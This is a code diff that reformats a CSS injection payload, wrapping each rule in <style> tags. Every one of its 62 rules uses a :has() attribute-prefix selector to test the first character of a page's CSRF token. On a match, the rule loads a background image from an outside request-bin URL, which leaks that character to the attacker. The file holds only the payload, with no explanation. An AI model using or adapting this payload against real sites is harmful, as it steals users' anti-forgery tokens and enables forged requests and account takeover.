@@ -1,63 +1,310 @@
-body:has(input[name="csrf"][value^="a"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/a)}
-body:has(input[name="csrf"][value^="b"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/b)}
-body:has(input[name="csrf"][value^="c"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/c)}
-body:has(input[name="csrf"][value^="d"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/d)}
-body:has(input[name="csrf"][value^="e"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/e)}
-body:has(input[name="csrf"][value^="f"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/f)}
-body:has(input[name="csrf"][value^="g"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/g)}
-body:has(input[name="csrf"][value^="h"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/h)}
-body:has(input[name="csrf"][value^="i"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/i)}
-body:has(input[name="csrf"][value^="j"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/j)}
-body:has(input[name="csrf"][value^="k"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/k)}
-body:has(input[name="csrf"][value^="l"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/l)}
-body:has(input[name="csrf"][value^="m"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/m)}
-body:has(input[name="csrf"][value^="n"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/n)}
-body:has(input[name="csrf"][value^="o"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/o)}
-body:has(input[name="csrf"][value^="p"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/p)}
-body:has(input[name="csrf"][value^="q"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/q)}
-body:has(input[name="csrf"][value^="r"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/r)}
-body:has(input[name="csrf"][value^="s"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/s)}
-body:has(input[name="csrf"][value^="t"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/t)}
-body:has(input[name="csrf"][value^="u"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/u)}
-body:has(input[name="csrf"][value^="v"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/v)}
-body:has(input[name="csrf"][value^="w"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/w)}
-body:has(input[name="csrf"][value^="x"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/x)}
-body:has(input[name="csrf"][value^="y"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/y)}
-body:has(input[name="csrf"][value^="z"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/z)}
-body:has(input[name="csrf"][value^="A"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/A)}
-body:has(input[name="csrf"][value^="B"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/B)}
-body:has(input[name="csrf"][value^="C"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/C)}
-body:has(input[name="csrf"][value^="D"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/D)}
-body:has(input[name="csrf"][value^="E"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/E)}
-body:has(input[name="csrf"][value^="F"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/F)}
-body:has(input[name="csrf"][value^="G"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/G)}
-body:has(input[name="csrf"][value^="H"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/H)}
-body:has(input[name="csrf"][value^="I"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/I)}
-body:has(input[name="csrf"][value^="J"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/J)}
-body:has(input[name="csrf"][value^="K"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/K)}
-body:has(input[name="csrf"][value^="L"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/L)}
-body:has(input[name="csrf"][value^="M"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/M)}
-body:has(input[name="csrf"][value^="N"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/N)}
-body:has(input[name="csrf"][value^="O"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/O)}
-body:has(input[name="csrf"][value^="P"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/P)}
-body:has(input[name="csrf"][value^="Q"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/Q)}
-body:has(input[name="csrf"][value^="R"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/R)}
-body:has(input[name="csrf"][value^="S"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/S)}
-body:has(input[name="csrf"][value^="T"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/T)}
-body:has(input[name="csrf"][value^="U"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/U)}
-body:has(input[name="csrf"][value^="V"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/V)}
-body:has(input[name="csrf"][value^="W"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/W)}
-body:has(input[name="csrf"][value^="X"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/X)}
-body:has(input[name="csrf"][value^="Y"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/Y)}
-body:has(input[name="csrf"][value^="Z"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/Z)}
-body:has(input[name="csrf"][value^="0"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/0)}
-body:has(input[name="csrf"][value^="1"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/1)}
-body:has(input[name="csrf"][value^="2"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/2)}
-body:has(input[name="csrf"][value^="3"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/3)}
-body:has(input[name="csrf"][value^="4"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/4)}
-body:has(input[name="csrf"][value^="5"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/5)}
-body:has(input[name="csrf"][value^="6"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/6)}
-body:has(input[name="csrf"][value^="7"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/7)}
-body:has(input[name="csrf"][value^="8"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/8)}
-body:has(input[name="csrf"][value^="9"]){background-image:url(https://eoolv8mg5a4hgei.m.pipedream.net/9)}
-                                                               
+<style>
+body:has(input[name="csrf"][value^="a"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/a)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="b"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/b)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="c"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/c)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="d"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/d)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="e"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/e)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="f"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/f)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="g"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/g)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="h"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/h)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="i"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/i)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="j"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/j)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="k"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/k)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="l"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/l)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="m"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/m)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="n"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/n)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="o"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/o)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="p"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/p)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="q"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/q)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="r"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/r)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="s"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/s)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="t"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/t)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="u"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/u)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="v"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/v)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="w"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/w)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="x"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/x)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="y"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/y)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="z"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/z)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="A"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/A)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="B"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/B)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="C"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/C)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="D"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/D)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="E"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/E)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="F"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/F)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="G"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/G)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="H"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/H)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="I"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/I)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="J"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/J)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="K"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/K)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="L"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/L)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="M"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/M)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="N"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/N)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="O"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/O)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="P"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/P)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="Q"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/Q)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="R"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/R)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="S"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/S)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="T"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/T)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="U"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/U)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="V"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/V)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="W"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/W)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="X"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/X)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="Y"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/Y)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="Z"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/Z)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="0"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/0)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="1"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/1)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="2"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/2)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="3"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/3)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="4"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/4)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="5"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/5)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="6"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/6)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="7"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/7)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="8"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/8)
+}
+</style>
+<style>
+body:has(input[name="csrf"][value^="9"]) {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/9)
+}
+</style>
